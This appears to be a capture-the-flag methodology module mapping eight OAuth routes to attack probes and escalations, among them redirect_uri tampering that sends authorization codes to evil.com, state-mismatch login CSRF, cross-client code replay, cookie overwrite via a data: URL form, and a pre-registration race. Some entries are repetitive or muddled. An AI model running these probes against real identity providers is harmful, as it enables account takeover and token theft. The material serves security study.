# Per-route — the OAuth routes, with the full mechanics

The per-route module names each route. This module carries the full
mechanics — the route, the artifact, the probe, the confirmation, the
falsifier, and the escalation.

## Route 1 — `GET /login`

**The artifact**: `GET /login` → `302` → `GET /authorize`.

**The probe**: `GET /login` — the `302` carries the `authorize` URL.

**The confirmation**: a `302` + `Location: https://idp/authorize?...` — the
`authorize` URL is the exploit surface.

**The falsifier**: `GET /login` returns a login form — the OAuth flow is
not the login mechanism.

**The escalation**: walk the `authorize` URL — every parameter is a testable
surface.

## Route 2 — `GET /authorize`

**The artifact**: `GET /authorize?client_id=...&redirect_uri=...&response_type=...&state=...`

**The probe**: `authorize?...&redirect_uri=https://evil.com/callback` — a
URI not in the registered allowlist.

**The confirmation**: a `302` + `Location: https://evil.com/callback?code=ABC` —
the code is delivered to the attacker.

**The falsifier**: `400 invalid redirect_uri` — the `redirect_uri` is
validated exactly.

**The escalation**: code-interception — the code is delivered to the
attacker's endpoint; replay it against the app's callback.

## Route 3 — `GET /callback`

**The artifact**: `GET /callback?code=...&state=...`

**The probe**: `callback?code=ABC&state=DIFFERENT` — a `state` the session
never stored.

**The confirmation**: a `302` + `Set-Cookie: session=...` — the session is
issued on the victim's account.

**The falsifier**: `400 state mismatch` — the `state` is bound to the session.

**The escalation**: login-CSRF or linking-CSRF — the victim visits the
attacker's authorize URL; the callback accepts the code and issues a session
on the victim's account.

## Route 4 — `POST /token`

**The artifact**: `POST /token {grant_type=authorization_code, code=..., client_id=..., client_secret=..., redirect_uri=...}`

**The probe**: `token` request with `client_id=B` — a code minted for client
A exchanged as client B.

**The confirmation**: a `200` + `{"access_token": "AT"}` — the token is issued
for client B.

**The falsifier**: `400 invalid_client` — the `client_id` is bound to the code.

**The escalation**: code replay — a code minted for client A is replayable
by client B; the `id_token` with `aud=B` is accepted.

## Route 5 — `POST /api/login`

**The artifact**: `POST /api/login {email: ..., password: ...}`

**The probe**: `POST /api/login` `Content-Type: text/plain` — the raw JSON
lands; the `Set-Cookie` overwrites the shared jar's token.

**The confirmation**: a `200` + `Set-Cookie: token=NEW` — the token is
overwritten.

**The falsifier**: `SameSite=Lax|Strict` on the IdP token — the cross-site
write does not land.

**The escalation**: `data:text/html` URL carries a form that POSTs to the
IdP's `/api/login` — the `Set-Cookie` overwrites the shared jar's token;
the `loginSSO` step uses the swapped token.

## Route 6 — `POST /api/register`

**The artifact**: `POST /api/register {email: ..., password: ..., username: ...}`

**The probe**: `register` the same account twice — the account is registered
with the attacker's password.

**The confirmation**: a `200` + `{"status": "registered"}` — the account is
registered; the OAuth login lands on the attacker's account.

**The falsifier**: `409 Conflict` — the account is already registered; the
registration is idempotent.

**The escalation**: pre-registration race — the attacker hammers
`POST /api/register` for the bot's account before the bot's `registerUser`
step runs.

## Route 7 — `GET /dashboard`

**The artifact**: `GET /dashboard` — the session is valid.

**The probe**: `GET /dashboard` — the session is valid.

**The confirmation**: a `200` + the dashboard content — the session is valid.

**The falsifier**: a `302` + `Location: /login` — the session is not valid.

**The escalation**: the session is confirmed — move to the sink.

## Route 8 — `GET /submission/:id`

**The artifact**: `GET /submission/:id` — the flag is on the account.

**The probe**: `GET /submission/1` — the flag is on the account.

**The confirmation**: a `200` + `{"flag": "HTB{...}"}` — the flag is on the
account.

**The falsifier**: a `403` or `404` — the flag is on a different account.

**The escalation**: the flag is confirmed — the sink is reached.
